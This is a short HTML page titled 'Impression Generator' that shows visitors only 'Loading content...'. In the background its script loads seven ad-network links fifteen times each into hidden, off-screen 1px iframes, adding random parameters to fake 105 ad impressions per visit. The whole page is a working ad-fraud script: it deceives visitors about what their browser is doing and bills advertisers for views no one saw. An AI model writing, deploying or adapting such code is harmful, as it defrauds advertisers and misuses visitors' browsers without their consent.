<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Impression Generator</title>
  <style>
    iframe {
      width: 1px;
      height: 1px;
      border: none;
      position: absolute;
      left: -9999px;
    }
  </style>
</head>
<body>

  <h2>Loading content...</h2>

  <script>
    const links = [
      "https://www.profitableratecpm.com/idtbuqe5?key=57352a42e96e5d6c227c437579418334",
      "https://www.profitableratecpm.com/wvekpja5?key=f29faf9b9e593845f3c3cbf0550b9d69",
      "https://www.profitableratecpm.com/mzd5ukckmy?key=46d478a02a09c89318c1306261c4a32e",
      "https://www.profitableratecpm.com/j9qqjfjf?key=abe628b4771688035147005130cb9dc0",
      "https://www.profitableratecpm.com/p5qy359k?key=57c87d131f666fcbb492edfa88726940",
      "https://www.profitableratecpm.com/ims71ex5ha?key=e506de69783a64cf45c57c4109e141a3",
      "https://www.profitableratecpm.com/ecfwq74hz?key=5d05e8747e8cadf81aecfae38eecce5d"
    ];

    for (let i = 0; i < 15; i++) { // 7 links × 15 loops = 105 impressions
      links.forEach(link => {
        const iframe = document.createElement("iframe");
        iframe.src = link + "&i=" + Math.random();
        document.body.appendChild(iframe);
      });
    }
  </script>

</body>
</html>
